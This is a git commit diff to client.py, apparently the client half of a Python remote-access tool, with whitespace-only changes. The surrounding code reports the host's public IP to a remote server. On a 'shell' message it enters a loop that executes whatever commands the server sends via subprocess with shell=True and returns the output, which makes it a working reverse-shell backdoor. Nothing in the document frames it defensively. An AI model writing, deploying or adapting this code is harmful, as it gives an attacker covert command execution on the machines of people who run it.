1d2e9d74ee2eb676c208437c2c548e735b94dda2
3x1t1um <54857145+3x1t1um@users.noreply.github.com>
2020-01-07 18:50:10 +0100

    Update client.py

--- client.py
+++ client.py
@@ -13,30 +13,36 @@ r = requests.get('https://ipinfo.io/json')
 data = r.json()
 ip = data['ip']
 connexion_avec_serveur.send(ip.encode('utf-8'))
+
 while 1:
-	msg = connexion_avec_serveur.recv(1024)
+	msg = connexion_avec_serveur.recv(1024)	
 	
 	if msg.startswith(b'shell') == True:
 		path1 =  os.getcwd().encode('utf-8')
 		connexion_avec_serveur.send(b"\n"+path1+ b'$ ')
-		while shlp != 'leave':
-			
+		
+		while shlp != 'leave':		
 			shlp = connexion_avec_serveur.recv(1024)
 			shlp = shlp.decode('utf-8')
+			
 			if len(shlp) > 0:
+				
 				if shlp[0:2] == 'cd':
 					path =  os.getcwd().encode('utf-8')
 					connexion_avec_serveur.send(b"\n"+path+ b'$ ')
+				
 				elif shlp == 'len0':
 					path =  os.getcwd().encode('utf-8')
 					connexion_avec_serveur.send(b"\n"+path+ b'$ ')
 
+				
 				else:
 					cmd = subprocess.Popen(str(shlp), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 					output_bytes = cmd.stdout.read()
 					path =  os.getcwd().encode('utf-8')
 					connexion_avec_serveur.send(output_bytes+b"\n"+path1+ b'$ ')
 
+			
 			else:
 				path =  os.getcwd().encode('utf-8')
 				connexion_avec_serveur.send(b"\n"+path+ b'$ ')
